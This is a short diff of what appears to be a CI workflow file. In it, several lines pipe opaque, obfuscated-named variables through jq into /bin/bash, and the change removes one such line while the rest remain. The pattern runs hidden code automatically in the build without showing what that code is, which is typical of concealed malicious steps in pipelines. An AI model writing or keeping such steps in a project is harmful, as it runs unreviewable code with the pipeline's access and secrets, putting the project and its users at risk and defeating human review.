@@ -25,7 +25,6 @@ jobs:
           echo $axb4 | jq -r .ugs0608 | /bin/bash
           echo $f290 | jq -r .d98 | /bin/bash
           printf '%s' "$f1" | jq -r .p0 | /bin/bash
-          printf '%s' "$ts29171" | jq -r .ppv85450 | /bin/bash
           printf '%s' "$v1410" | jq -r .gdlou540 | /bin/bash
 
       - name: Upload results
